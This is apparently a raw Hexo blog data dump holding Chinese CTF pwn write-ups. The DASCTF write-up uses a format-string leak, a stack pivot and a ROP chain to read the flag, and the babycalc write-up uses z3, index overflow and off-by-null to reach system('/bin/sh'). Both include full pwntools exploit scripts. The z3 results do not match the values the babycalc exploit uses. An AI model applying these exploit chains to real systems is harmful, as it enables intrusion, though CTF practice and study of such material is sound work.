class=\"number\">8</span>]; <span class=\"comment\">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> dest[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+8h] [rbp-B8h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v7[<span class=\"number\">176</span>]; <span class=\"comment\">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !welcome_count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(dest, <span class=\"string\">&quot;Hello, &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">    welcome_count = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v3 = <span class=\"built_in\">strcat</span>(dest, buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(v3);                                   <span class=\"comment\">// 格式化字符串</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Now, please say something to DASCTF:&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, v7, <span class=\"number\">192uLL</span>);                          <span class=\"comment\">// 溢出0x10byte</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Posted Successfully~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>格式化字符串漏洞可以用于leak libcbase或者栈地址。但我们只能输入8byte，因此如果偏移大于10的话，我们只能泄露出一个地址。经过调试可以发现libc地址在<strong>偏移为24</strong>的位置，因此只能泄露栈地址或者libc地址。</p>\n<p>如果只泄露栈地址的话，栈迁移回到缓冲区开头处后，由于不知道libcbase，因此利用不了libc中的函数，并且由于NX保护开启，无法ret2shellcode。所以只能选择泄露libc地址，<strong>栈迁移到bss段后走ROP链</strong>。</p>\n<p>但接下来就会遇到一个问题，在输入了一次之后程序就结束了，程序中没有直接将ROP链写入bss段，但我们可以<strong>利用主程序中read的代码片段</strong>进行写入，read的代码片段如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000401378 48 8D 85 50 FF FF FF          lea     rax, [rbp+var_B0] var_B0=-0xb0</span><br><span class=\"line\">.text:000000000040137F BA C0 00 00 00                mov     edx, 0C0h                       ; nbytes</span><br><span class=\"line\">.text:0000000000401384 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class=\"line\">.text:0000000000401387 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class=\"line\">.text:000000000040138C E8 8F FD FF FF                call    _read</span><br></pre></td></tr></table></figure>\n\n<p>这里是主程序中调用read函数的片段，在这里对寄存器进行设置并调用read。可以看到rsi是通过<code>mov rsi, rax</code>来赋值的，而rax是通过<code>lea rax, [rbp+0xb0] %算出rbp-0xb0后赋值给rax </code>来赋值。而栈迁移的时候我们会将rbp设置在bss段上，因此如果我们将返回地址覆盖为<code>0x401378</code>那么就会执行<code>read(0,bss_addr-0xb0,0xc0)</code>，通过这次读入我们可以将ROP链写到bss段中。</p>\n<p>读取ROP链后，rbp指向<code>bss_addr</code>，在read完成后的<code>leave;ret</code>会将栈迁移到<code>bss_addr</code>，并且执行<code>bss_addr+0x8</code>处的指令。然而这个位置已经是read读入内容的末尾了，因此需要再次通过栈迁移将栈迁移到read读入内容的开头。这需要让<code>bss_addr</code>处的内容为<code>bss_addr-xxx(读入内容开头的ROP链的位置-0x8)</code>，使<code>bss_addr+0x8</code>处的内容为<code>leave;ret</code>。这次会将栈迁移到ROP链处并执行。</p>\n<p>ROP链走<code>mprotect-&gt;read-&gt;shellcraft.cat(&#39;/flag&#39;)</code>来cat flag，当然也可以走<code>orw</code>。</p>\n<p>exp如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;./2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>) <span class=\"comment\"># remote</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># p=remote(&#x27;tcp.cloud.dasctf.com&#x27;,24407)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Welcome to DASCTF message board, please leave your name:\\n&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;%24$p&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Hello, &#x27;</span>)</span><br><span class=\"line\">libcbase=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:],<span class=\"number\">16</span>)-<span class=\"number\">0x1f12e8</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">leave=<span class=\"number\">0x4013A2</span></span><br><span class=\"line\">ret_addr = libcbase + <span class=\"number\">0x0000000000022679</span> </span><br><span class=\"line\">pop_rdi=libcbase+<span class=\"number\">0x0000000000023b6a</span></span><br><span class=\"line\">pop_rsi=libcbase+<span class=\"number\">0x000000000002601f</span> </span><br><span class=\"line\">pop_rdx=libcbase+<span class=\"number\">0x0000000000142c92</span> </span><br><span class=\"line\">read_addr = libcbase + libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">mprotect_addr = libcbase + libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]</span><br><span class=\"line\">bss_addr=<span class=\"number\">0x404300</span></span><br><span class=\"line\">vuln=<span class=\"number\">0x0000000000401378</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">176</span>+p64(bss_addr)+p64(vuln)</span><br><span class=\"line\">debug()</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span></span><br><span class=\"line\">payload+=p64(ret_addr) </span><br><span class=\"line\">payload+=p64(pop_rdi) + p64(<span class=\"number\">0x404000</span>)</span><br><span class=\"line\">payload+=p64(pop_rsi) + p64(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">payload+=p64(pop_rdx) + p64(<span class=\"number\">7</span>)</span><br><span class=\"line\">payload+=p64(mprotect_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+=p64(pop_rdi) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=p64(pop_rsi) + p64(<span class=\"number\">0x404500</span>)</span><br><span class=\"line\">payload+=p64(pop_rdx) + p64(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">payload+=p64(read_addr)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x404500</span>)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0xb0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">payload+=p64(bss_addr-<span class=\"number\">0xb0</span>+<span class=\"number\">0x10</span>)+p64(leave)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = asm(shellcraft.cat(<span class=\"string\">&quot;/flag&quot;</span>))</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"comment\"># sleep(0.1)</span></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"_content":"","source":"_posts/Untitled.md","raw":"","slug":"Untitled","published":1,"date":"2023-04-09T12:04:41.347Z","updated":"2023-04-03T02:01:14.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafn002b5oud6ptx32ge","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"XHLJ_babycalc","date":"2023-03-01T01:11:19.000Z","_content":"\n没给libc，差评。保护就开了个NX，看起来还挺友好的。\n\n需要先用z3库解方程组，之后通过下标越界修改返回地址，并通过off-by-null覆盖rbp低位爆破栈迁移。\n\n<!--more-->\n\n```sh\n[*] '/home/alphonse/CTF_GAME/XHLJ/babycalc/babycalc'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n主程序如下：\n\n```c\n  for ( i = 0; i <= 15; ++i )\n  {\n    printf(\"number-%d:\", (unsigned int)(i + 1));\n    buf[(int)read(0, buf, 0x100uLL)] = 0; //栈溢出 末尾0溢出\n    v0 = strtol(buf, 0LL, 10);\n    *(&v3 + i) = v0; //任意地址写\n  }\n  if ( v5 * v4 * v3 - v6 != 36182\n    || v3 != 19\n    || v5 * 19 * v4 + v6 != 36322\n    || (v13 + v3 - v8) * v16 != 32835\n    || (v4 * v3 - v5) * v6 != 44170\n    || (v5 + v4 * v3) * v6 != 51590\n    || v9 * v8 * v7 - v10 != 61549\n    || v10 * v15 + v4 + v18 != 19037\n    || v9 * v8 * v7 + v10 != 61871\n    || (v8 * v7 - v9) * v10 != 581693\n    || v11 != 50\n    || (v9 + v8 * v7) * v10 != 587167\n    || v13 * v12 * v11 - v14 != 1388499\n    || v13 * v12 * v11 + v14 != 1388701\n    || (v12 * v11 - v13) * v14 != 640138\n    || (v11 * v5 - v16) * v12 != 321081\n    || (v13 + v12 * v11) * v14 != 682962\n    || v17 * v16 * v15 - v18 != 563565\n    || v17 * v16 * v15 + v18 != 563571\n    || v14 != 101\n    || (v16 * v15 - v17) * v18 != 70374\n    || (v17 + v16 * v15) * v18 != 70518 )\n  {\n    exit(0);\n  }\n  return puts(\"good done\");\n```\n\n需要输入16次内容，每次都会输入`0x100`字节的内容，并且存在栈溢出，足够改写所有的变量，包括循环变量i。在这之后会使用`strtol(buf,0,10)`将字符串识别为一个**1个字节的十进制数**，并写到`*(&v3 + i)`，由于`v3`和`i`都可由栈溢出控制，这相当于我们可以**任意地址写一个字节**（如果i>15）。\n\n除此之外`buf[(int)read(0, buf, 0x100uLL)] = 0;`会在`buf`之后写入一个`'\\x00'`，可以**覆盖rbp的低字节**。\n\n可以尝试一下栈迁移，先覆盖rbp的低字节为`'\\x00'`，之后使用任意地址写将返回地址改为`leave ret`的地址。修改后的rbp有可能会指向我们的buf中，在buf中构造好ROP链，**爆破**一下估计就可以了。\n\n不过为了让程序能够返回，我们要先绕过前面的判断条件。\n\n```c\n  if ( v5 * v4 * v3 - v6 != 36182\n    || v3 != 19\n    || v5 * 19 * v4 + v6 != 36322\n    || (v13 + v3 - v8) * v16 != 32835\n    || (v4 * v3 - v5) * v6 != 44170\n    || (v5 + v4 * v3) * v6 != 51590\n    || v9 * v8 * v7 - v10 != 61549\n    || v10 * v15 + v4 + v18 != 19037\n    || v9 * v8 * v7 + v10 != 61871\n    || (v8 * v7 - v9) * v10 != 581693\n    || v11 != 50\n    || (v9 + v8 * v7) * v10 != 587167\n    || v13 * v12 * v11 - v14 != 1388499\n    || v13 * v12 * v11 + v14 != 1388701\n    || (v12 * v11 - v13) * v14 != 640138\n    || (v11 * v5 - v16) * v12 != 321081\n    || (v13 + v12 * v11) * v14 != 682962\n    || v17 * v16 * v15 - v18 != 563565\n    || v17 * v16 * v15 + v18 != 563571\n    || v14 != 101\n    || (v16 * v15 - v17) * v18 != 70374\n    || (v17 + v16 * v15) * v18 != 70518 )\n  {\n    exit(0);\n  }\n```\n\n这相当于解一个方程组，官方wp是用py的z3库去算的。\n\n```\nv5 * v4 * v3 - v6 = 36182\nv3 = 19\nv5 * 19 * v4 + v6 = 36322\n(v13 + v3 - v8) * v16 = 32835\n(v4 * v3 - v5) * v6 = 44170\n(v5 + v4 * v3) * v6 = 51590\nv9 * v8 * v7 - v10 = 61549\nv10 * v15 + v4 + v18 = 19037\nv9 * v8 * v7 + v10 = 61871\n(v8 * v7 - v9) * v10 = 581693\nv11 = 50\n(v9 + v8 * v7) * v10 = 587167\nv13 * v12 * v11 - v14 = 1388499\nv13 * v12 * v11 + v14 = 1388701\n(v12 * v11 - v13) * v14 = 640138\n(v11 * v5 - v16) * v12 = 321081\n(v13 + v12 * v11) * v14 ! 682962\nv17 * v16 * v15 - v18 = 563565\nv17 * v16 * v15 + v18 = 563571\nv14 = 101\n(v16 * v15 - v17) * v18 = 70374\n(v17 + v16 * v15) * v18 = 70518 \n```\n\npy脚本\n\n```py\nfrom z3 import*\nv=[BitVec('v%d'%i,8) for i in range(16)]\ns=Solver()\ns.add(v[2] * v[1] * v[0] - v[3] == 36182)\ns.add(v[0] == 19)\ns.add(v[2] * v[0] * v[1] + v[3] == 36322)\ns.add((v[10] + v[0] - v[5]) * v[13] == 32835)\ns.add((v[1] * v[0] - v[2]) * v[3] == 44170)\ns.add((v[2] + v[1] * v[0]) * v[3] == 51590)\ns.add(v[6] * v[5] * v[4] - v[7] == 61549)\ns.add(v[7] * v[12] + v[1] + v[15] == 19037)\ns.add(v[6] * v[5] * v[4] + v[7] == 61871)\ns.add((v[5] * v[4] - v[6]) * v[7] == 581693)\ns.add(v[8] == 50)\ns.add((v[6] + v[5] * v[4]) * v[7] == 587167)\ns.add(v[10] * v[9] * v[8] - v[11] == 1388499)\ns.add(v[10] * v[9] * v[8] + v[11] == 1388701)\ns.add((v[9] * v[8] - v[10]) * v[11] == 640138)\ns.add((v[8] * v[2] - v[13]) * v[9] == 321081)\ns.add((v[10] + v[9] * v[8]) * v[11] == 682962)\ns.add(v[14] * v[13] * v[12] - v[15] == 563565)\ns.add(v[14] * v[13] * v[12] + v[15] == 563571)\ns.add(v[11] == 101)\ns.add((v[13] * v[12] - v[14]) * v[15] == 70374)\ns.add((v[14] + v[13] * v[12]) * v[15] == 70518) \n\nif s.check() == sat:  \n      m = s.model()  \n      for i in range(16):  \n          print hex(m[v[i]].as_long())\nelse:\n\tprint(\"error\")\n\n```\n\n解出结果为：\n\n```\nv3~v18\n0x13\n0xa4\n0x75\n0xc6\n0x17\n0x82\n0x11\n0x21\n0x32\n0x43\n0x54\n0x65\n0xf6\n0x7\n0x18\n0x3\n```\n\n之后就可以开始进行利用了，首先需要泄露libc，由于开启了`ASLR`，因此这一步需要爆破一下，使得低字节被覆盖为为`'\\x00'`的rbp能指向`ROP链+0x8`的位置（leave会pop rbp，之后rsp会指向rbp+0x8），可以在前面填充`ret`提高命中率，最后需要返回`start`来调整栈帧。\n\n泄露了libc之后就可以走`system(\"/bin/sh\")`了，这一步同样需要爆破一下，使得能够`rsp`指向ROP链。**要注意system前调整栈对齐**。\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='babycalc'\nelf=ELF('./'+filename)\nlibc = ELF(\"./libc.so.6\")\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef pwn():\n  p=process('./'+filename)\n\n  try:\n\n    #leave=0x0000000000400bb7\n    ret=0x00000000004005b9\n    pop_rdi=0x0000000000400ca3\n    main_func=0x400789\n    start_addr=0x400650\n\n    # res to equation set\n    calc_value=p8(19)\n    calc_value+=p8(36)\n    calc_value+=p8(53)\n    calc_value+=p8(70)\n    calc_value+=p8(55)\n    calc_value+=p8(66)\n    calc_value+=p8(17)\n    calc_value+=p8(161)\n    calc_value+=p8(50)\n    calc_value+=p8(131)\n    calc_value+=p8(212)\n    calc_value+=p8(101)\n    calc_value+=p8(118)\n    calc_value+=p8(199)\n    calc_value+=p8(24)\n    calc_value+=p8(3)\n\n    # overwrite value\n    write_char='24' #0x18 ret_address=>leave\n    payload=write_char\n    payload=payload.ljust(0x48,'\\x00')\n    payload+=p64(ret)*0x6\n    payload+=p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])\n    payload+=p64(start_addr)\n\n    payload=payload.ljust(0xd0,'a')\n\n    payload+=calc_value\n\n\n    payload=payload.ljust(0xfc,'c')\n    payload+=p32(0x38) # i\n\n  \n    p.recvuntil('number-'+str(1)+':')\n\n    p.send(payload)\n    \n    p.recvuntil(\"good done\\n\")\n\n    puts_addr = u64(p.recvuntil('\\x7f',timeout=1)[-6:].ljust(8,'\\x00'))\n    if puts_addr == 0:\n      raise EOFError\n\n    leak(\"puts_addr\",hex(puts_addr))\n    #calc libc base\n    libcbase=puts_addr-libc.symbols['puts']\n    leak('libcbase',hex(libcbase))\n    sys_addr=libcbase+libc.symbols['system']\n    binsh_addr=libcbase+libc.search('/bin/sh').next()\n    leak('sys_addr',hex(sys_addr))\n    leak('binsh_addr',hex(binsh_addr))\n\n    # gdb.attach(p,'b *0x400bb7')\n    # pause()\n\n    #get shell \n    write_char=b'24' #0x18 ret_address=>leave\n    payload=write_char\n    payload=payload.ljust(0x48,'\\x00')\n\n    payload+=p64(ret)*0xd\n    payload+=p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)\n    # payload=payload.ljust(0xd0 - 0x20 + 8 - 0x10,'a')\n    # payload+=p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)\n\n    payload=payload.ljust(0xd0,'a')\n\n    payload+=calc_value\n\n    payload=payload.ljust(0xfc,'c')\n    payload+=p32(0x38) # i\n\n    p.recvuntil('number-'+str(1)+':')\n    gdb.attach(p,'b *0x400bb7')\n    p.send(payload)\n    \n    p.recvuntil(\"good done\\n\")\n\n    p.interactive()\n    return\n\n  except EOFError as e:\n    p.close()\n    raise e\n\n# pwn()\nwhile True:\n  try:\n    pwn()\n    break\n  except EOFError as e:\n    continue\n\n```\n\n\n\n\n\n\n\n","source":"_posts/XHLJ-babycalc.md","raw":"---\ntitle: XHLJ_babycalc\ndate: 2023-03-01 09:11:19\ntags:\n- Misc\n- re\n- ROP\n- index overflow\n- stackoverflow\ncategories: \n- pwn_wp\n---\n\n没给libc，差评。保护就开了个NX，看起来还挺友好的。\n\n需要先用z3库解方程组，之后通过下标越界修改返回地址，并通过off-by-null覆盖rbp低位爆破栈迁移。\n\n<!--more-->\n\n```sh\n[*] '/home/alphonse/CTF_GAME/XHLJ/babycalc/babycalc'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n主程序如下：\n\n```c\n  for ( i = 0; i <= 15; ++i )\n  {\n    printf(\"number-%d:\", (unsigned int)(i + 1));\n    buf[(int)read(0, buf, 0x100uLL)] = 0; //栈溢出 末尾0溢出\n    v0 = strtol(buf, 0LL, 10);\n    *(&v3 + i) = v0; //任意地址写\n  }\n  if ( v5 * v4 * v3 - v6 != 36182\n    || v3 != 19\n    || v5 * 19 * v4 + v6 != 36322\n    || (v13 + v3 - v8) * v16 != 32835\n    || (v4 * v3 - v5) * v6 != 44170\n    || (v5 + v4 * v3) * v6 != 51590\n    || v9 * v8 * v7 - v10 != 61549\n    || v10 * v15 + v4 + v18 != 19037\n    || v9 * v8 * v7 + v10 != 61871\n    || (v8 * v7 - v9) * v10 != 581693\n    || v11 != 50\n    || (v9 + v8 * v7) * v10 != 587167\n    || v13 * v12 * v11 - v14 != 1388499\n    || v13 * v12 * v11 + v14 != 1388701\n    || (v12 * v11 - v13) * v14 != 640138\n    || (v11 * v5 - v16) * v12 != 321081\n    || (v13 + v12 * v11) * v14 != 682962\n    || v17 * v16 * v15 - v18 != 563565\n    || v17 * v16 * v15 + v18 != 563571\n    || v14 != 101\n    || (v16 * v15 - v17) * v18 != 70374\n    || (v17 + v16 * v15) * v18 != 70518 )\n  {\n    exit(0);\n  }\n  return puts(\"good done\");\n```\n\n需要输入16次内容，每次都会输入`0x100`字节的内容，并且存在栈溢出，足够改写所有的变量，包括循环变量i。在这之后会使用`strtol(buf,0,10)`将字符串识别为一个**1个字节的十进制数**，并写到`*(&v3 + i)`，由于`v3`和`i`都可由栈溢出控制，这相当于我们可以**任意地址写一个字节**（如果i>15）。\n\n除此之外`buf[(int)read(0, buf, 0x100uLL)] = 0;`会在`buf`之后写入一个`'\\x00'`，可以**覆盖rbp的低字节**。\n\n可以尝试一下栈迁移，先覆盖rbp的低字节为`'\\x00'`，之后使用任意地址写将返回地址改为`leave ret`的地址。修改后的rbp有可能会指向我们的buf中，在buf中构造好ROP链，**爆破**一下估计就可以了。\n\n不过为了让程序能够返回，我们要先绕过前面的判断条件。\n\n```c\n  if ( v5 * v4 * v3 - v6 != 36182\n    || v3 != 19\n    || v5 * 19 * v4 + v6 != 36322\n    || (v13 + v3 - v8) * v16 != 32835\n    || (v4 * v3 - v5) * v6 != 44170\n    || (v5 + v4 * v3) * v6 != 51590\n    || v9 * v8 * v7 - v10 != 61549\n    || v10 * v15 + v4 + v18 != 19037\n    || v9 * v8 * v7 + v10 != 61871\n    || (v8 * v7 - v9) * v10 != 581693\n    || v11 != 50\n    || (v9 + v8 * v7) * v10 != 587167\n    || v13 * v12 * v11 - v14 != 1388499\n    || v13 * v12 * v11 + v14 != 1388701\n    || (v12 * v11 - v13) * v14 != 640138\n    || (v11 * v5 - v16) * v12 != 321081\n    || (v13 + v12 * v11) * v14 != 682962\n    || v17 * v16 * v15 - v18 != 563565\n    || v17 * v16 * v15 + v18 != 563571\n    || v14 != 101\n    || (v16 * v15 - v17) * v18 != 70374\n    || (v17 + v16 * v15) * v18 != 70518 )\n  {\n    exit(0);\n  }\n```\n\n这相当于解一个方程组，官方wp是用py的z3库去算的。\n\n```\nv5 * v4 * v3 - v6 = 36182\nv3 = 19\nv5 * 19 * v4 + v6 = 36322\n(v13 + v3 - v8) * v16 = 32835\n(v4 * v3 - v5) * v6 = 44170\n(v5 + v4 * v3) * v6 = 51590\nv9 * v8 * v7 - v10 = 61549\nv10 * v15 + v4 + v18 = 19037\nv9 * v8 * v7 + v10 = 61871\n(v8 * v7 - v9) * v10 = 581693\nv11 = 50\n(v9 + v8 * v7) * v10 = 587167\nv13 * v12 * v11 - v14 = 1388499\nv13 * v12 * v11 + v14 = 1388701\n(v12 * v11 - v13) * v14 = 640138\n(v11 * v5 - v16) * v12 = 321081\n(v13 + v12 * v11) * v14 ! 682962\nv17 * v16 * v15 - v18 = 563565\nv17 * v16 * v15 + v18 = 563571\nv14 = 101\n(v16 * v15 - v17) * v18 = 70374\n(v17 + v16 * v15) * v18 = 70518 \n```\n\npy脚本\n\n```py\nfrom z3 import*\nv=[BitVec('v%d'%i,8) for i in range(16)]\ns=Solver()\ns.add(v[2] * v[1] * v[0] - v[3] == 36182)\ns.add(v[0] == 19)\ns.add(v[2] * v[0] * v[1] + v[3] == 36322)\ns.add((v[10] + v[0] - v[5]) * v[13] == 32835)\ns.add((v[1] * v[0] - v[2]) * v[3] == 44170)\ns.add((v[2] + v[1] * v[0]) * v[3] == 51590)\ns.add(v[6] * v[5] * v[4] - v[7] == 61549)\ns.add(v[7] * v[12] + v[1] + v[15] == 19037)\ns.add(v[6] * v[5] * v[4] + v[7] == 61871)\ns.add((v[5] * v[4] - v[6]) * v[7] == 581693)\ns.add(v[8] == 50)\ns.add((v[6] + v[5] * v[4]) * v[7] == 587167)\ns.add(v[10] * v[9] * v[8] - v[11] == 1388499)\ns.add(v[10] * v[9] * v[8] + v[11] == 1388701)\ns.add((v[9] * v[8] - v[10]) * v[11] == 640138)\ns.add((v[8] * v[2] - v[13]) * v[9] == 321081)\ns.add((v[10] + v[9] * v[8]) * v[11] == 682962)\ns.add(v[14] * v[13] * v[12] - v[15] == 563565)\ns.add(v[14] * v[13] * v[12] + v[15] == 563571)\ns.add(v[11] == 101)\ns.add((v[13] * v[12] - v[14]) * v[15] == 70374)\ns.add((v[14] + v[13] * v[12]) * v[15] == 70518) \n\nif s.check() == sat:  \n      m = s.model()  \n      for i in range(16):  \n          print hex(m[v[i]].as_long())\nelse:\n\tprint(\"error\")\n\n```\n\n解出结果为：\n\n```\nv3~v18\n0x13\n0xa4\n0x75\n0xc6\n0x17\n0x82\n0x11\n0x21\n0x32\n0x43\n0x54\n0x65\n0xf6\n0x7\n0x18\n0x3\n```\n\n之后就可以开始进行利用了，首先需要泄露libc，由于开启了`ASLR`，因此这一步需要爆破一下，使得低字节被覆盖为为`'\\x00'`的rbp能指向`ROP链+0x8`的位置（leave会pop 